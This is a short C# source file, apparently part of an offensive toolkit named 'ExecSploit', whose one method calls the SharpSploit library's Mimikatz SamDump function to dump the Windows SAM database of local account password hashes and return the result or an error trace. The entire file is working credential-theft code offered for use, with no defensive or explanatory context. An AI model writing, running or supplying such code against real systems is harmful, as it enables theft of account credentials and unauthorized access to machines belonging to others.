using System;
using SharpSploit.Credentials;

namespace ExecSploit
{
    public static class SamDump
    {
        public static string Execute()
        {
            try
            {
                return SharpSploit.Credentials.Mimikatz.SamDump();
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}